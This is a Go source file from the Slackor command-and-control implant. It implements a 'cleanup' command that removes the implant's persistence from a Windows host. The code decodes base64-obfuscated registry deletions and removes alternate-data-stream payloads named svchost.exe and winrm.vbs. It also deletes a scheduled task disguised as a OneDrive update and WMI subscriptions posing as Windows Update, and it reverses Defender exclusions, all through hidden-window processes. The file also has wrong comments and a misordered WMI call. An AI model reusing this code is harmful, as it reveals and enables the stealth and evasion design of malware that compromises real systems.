// +build windows

package windows

import (
	"encoding/base64"
	"errors"
	"os"
	"os/exec"
	"syscall"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// CleanUp prints the contents of the file
type CleanUp struct{}

// Name is the name of the command
func (c CleanUp) Name() string {
	return "cleanup"
}

// Run prints the contents of the file
func (c CleanUp) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("cleanup takes 1 argument")
	}
	mode := args[0]
	appdata, _ := os.LookupEnv("APPDATA")
	path := appdata + "\\Windows:svchost.exe"
	os.Remove(path)
	path = appdata + "\\Windows:winrm.vbs"
	os.Remove(path)

	// TODO: use idiomatic go varnames, use backtick strings
	var err error
	switch mode {
	case "registry":
		CLEAN, err := os.Create("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		// REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /f
		var HKCU string = "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC9m"
		DecodedHKCU, err := base64.StdEncoding.DecodeString(HKCU)
		if err != nil {
			return "", err
		}
		CLEAN.WriteString(string(DecodedHKCU))
		Exec := exec.Command("cmd", "/c", string(DecodedHKCU))
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		Exec.Run()
		if checkForAdmin() {
			// REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Network /f
			var HKLM string = "UkVHIERFTEVURSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBOZXR3b3JrIC9m"
			DecodedHKLM, err := base64.StdEncoding.DecodeString(HKLM)
			if err != nil {
				return "", err
			}
			Exec2 := exec.Command("cmd", "/c", string(DecodedHKLM))
			Exec2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err = Exec2.Run()
			if err != nil {
				return "", err
			}
		}
	case "scheduler":
		var task string = "c2NodGFza3MgL2RlbGV0ZSAvVE4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC9m"
		Decodedtask, _ := base64.StdEncoding.DecodeString(task)
		//Creates a bat file
		TASK, err := os.Create("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
		TASK.WriteString(string(Decodedtask) + "\r\n")
		TASK.Close()
		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = Exec.Run()
		if err != nil {
			return "", err
		}
		err = os.Remove("C:\\Users\\Public\\build.bat")
		if err != nil {
			return "", err
		}
	case "exclusion":
		if checkForAdmin() {
			cmdName := "powershell.exe"
			cmdE := exec.Command(cmdName)
			cmdEArgs := []string{"Remove-MpPreference -ExclusionPath C:\\"}
			cmdE = exec.Command(cmdName, cmdEArgs...)
			cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err = cmdE.Run()
			if err != nil {
				return "", err
			}
		}
	case "realtime":
		cmdName := "powershell.exe"
		cmdRT := exec.Command(cmdName)
		cmdArgs := []string{"Set-MpPreference -DisableRealtimeMonitoring $false"}
		cmdRT = exec.Command(cmdName, cmdArgs...)
		cmdRT.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmdRT.Run()
		if err != nil {
			return "", err
		}
	case "wmi":
		if checkForAdmin() {
			cmdName := "powershell.exe"
			cmd := exec.Command(cmdName)
			cmdArgs := []string{"Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter \"Name='Windows Update Event'\" | Remove-WmiObject"}
			cmd = exec.Command(cmdName, cmdArgs...)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err = cmd.Run()
			if err != nil {
				return "", err
			}
			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter \"Name='Windows Update Consumer'\" | Remove-WmiObject"}
			cmd = exec.Command(cmdName, cmdArgs...)
			err = cmd.Run()
			if err != nil {
				return "", err
			}
			cmd = exec.Command(cmdName, cmdArgs...)
			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%Windows Update%'\" | Remove-WmiObject"}
			err = cmd.Run()
			if err != nil {
				return "", err
			}
		}
	case "signatures":
		cmdName := "cmd.exe"
		cmdS := exec.Command(cmdName)
		cmdArgs := []string{"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\"  -SignatureUpdate Set-MpPreference -DisableIOAVProtection $false"}
		cmdS = exec.Command(cmdName, cmdArgs...)
		cmdS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmdS.Run()
		if err != nil {
			return "", err
		}
	}

	return "Cleanup completed.", nil
}

func init() {
	command.RegisterCommand(CleanUp{})
}
